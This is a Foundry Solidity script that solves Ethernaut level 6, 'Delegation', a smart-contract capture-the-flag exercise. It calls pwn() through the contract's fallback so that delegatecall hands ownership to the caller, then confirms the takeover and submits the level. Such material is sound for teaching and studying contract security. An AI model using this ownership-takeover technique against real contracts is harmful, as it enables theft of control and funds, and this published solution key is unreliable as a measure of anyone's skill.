// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import {Delegation} from "../../challenge-contracts/06-Delegation.sol";

contract DelegationSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x73379d8B82Fda494ee59555f333DF7D44483fD58;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        ////////////////////////////////////////////////////////////////////////////////////
        // Start of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////
        // Step 1: Call `pwn()` function of Delegation contract (low-level call, use address directly),
        //         since Delegation contract has no such function, this will trigger `fallback()` function of Delegation contract,
        //         which will in turn trigger `pwn()` function of Delegate contract;
        (bool success, ) = challengeInstance.call(
            abi.encodeWithSignature("pwn()")
        );
        require(success, "Call to pwn failed");

        // Step 2: Confirm that caller `heroAddress` has successfully obtained ownership of the Delegation contract.
        address heroAddress = vm.addr(heroPrivateKey);
        Delegation dele = Delegation(challengeInstance);
        require(heroAddress == dele.owner(), "Owner check failed");

        ////////////////////////////////////////////////////////////////////////////////////
        // End of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(6));
    }
}
